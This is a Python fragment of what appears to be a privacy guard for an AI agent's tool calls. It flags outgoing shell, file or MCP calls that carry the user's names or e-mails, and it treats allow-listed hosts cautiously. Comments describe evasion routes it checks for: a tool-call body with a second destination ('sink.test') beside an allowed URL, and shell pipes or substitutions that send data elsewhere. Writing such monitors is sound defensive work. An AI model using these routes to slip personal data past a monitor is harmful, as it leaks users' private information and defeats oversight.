        if suffix in DOC_SUFFIXES:
            return []  # a note or report that mentions a User-Agent is not code that sends one
        code = joined + "\n" + _file_text(tool_input)
        if suffix in DATA_SUFFIXES:
            if not _DATA_SENDS.search(code):
                return []
        elif not NETWORK_CODE.search(code) or _local_only(code):
            return []
    host_ok = bool(ident.allow_hosts) and host_allowed(joined, ident.allow_hosts)
    if host_ok and tool_name not in SHELL_TOOLS:
        if tool_name in FILE_TOOLS:
            # code that names only allowed hosts and builds no other destination (the same proof as for localhost)
            if _only_to(joined + "\n" + _file_text(tool_input), lambda h: _allowed(h, ident.allow_hosts)):
                return []
        elif _one_destination(tool_name, tool_input, ident.allow_hosts):
            return []
        # an allowed URL next to code that builds another one, or a second destination in another field
        # (`{"url": "https://allowed.org", "host": "sink.test", "body": ...}`): scan as if nothing were allowed
        host_ok = False  # (Sol review r3)
    if host_ok:
        # a shell line can name an allowed host and still send elsewhere (pipes, substitutions, git host:path;
        # release review 2026-10-30), so an allowed host in a shell command turns a block into a question
        return [Finding(f.kind + "@host", f.needle, f.where)
                for f in scan_tool_call(tool_name, tool_input, replace(ident, allow_hosts=[]), strict, cwd)]
    needles = ident.needles()
    ignore = safe_ignore(ident)
    cut = re.compile("|".join(re.escape(x) for x in ignore), re.IGNORECASE) if ignore else None
    out, seen = [], set()
    # the repo owner is cut only from shell commands: in an MCP body or a file, `gh ... -R JanKowalski/x` is text
    # that is posted or saved (Astra review r5)
    fcut = forge_cut if tool_name in SHELL_TOOLS else str
    for t in texts:
        found = _hits(t, needles)
        named = fcut(cut.sub(" ", t) if cut else t)
        if named != t:  # e-mails from the whole call, names without ignored tokens and the user's own forge account
            found = [f for f in found if f.kind.startswith("email")] + \
                    [f for f in _hits(named, needles) if not f.kind.startswith("email")]
        for f in found:
            if (f.kind, f.needle) not in seen:
                seen.add((f.kind, f.needle))
                out.append(f)
    if out:
        return out
    for t in texts:
        extra = []
        if ident.fuzzy != "off" and len(t) <= FUZZY_MAX:
            for v in dict.fromkeys(views(fcut(cut.sub(" ", t) if cut else t))):  # URL-decoded, base64, "at"
                extra += fuzzy_hits(v, ident.emails, ident.names, ident.first_alone, ident.extra,
                                    ident.derived_names)
        if ident.contact_fields != "off" and len(t) <= FUZZY_MAX:
            extra += contact_hits(t, ident.allow_emails)
        for kind, what in extra:
            if (kind, what) not in seen:
                seen.add((kind, what))
                out.append(Finding(kind, fold(what), t[:80]))
    return out


# findings that are a question for the user (by default), not a hard block
ASK_KINDS = {"name-fuzzy", "surname-fuzzy", "first-fuzzy", "email-fuzzy", "extra-fuzzy", "contact-email"}

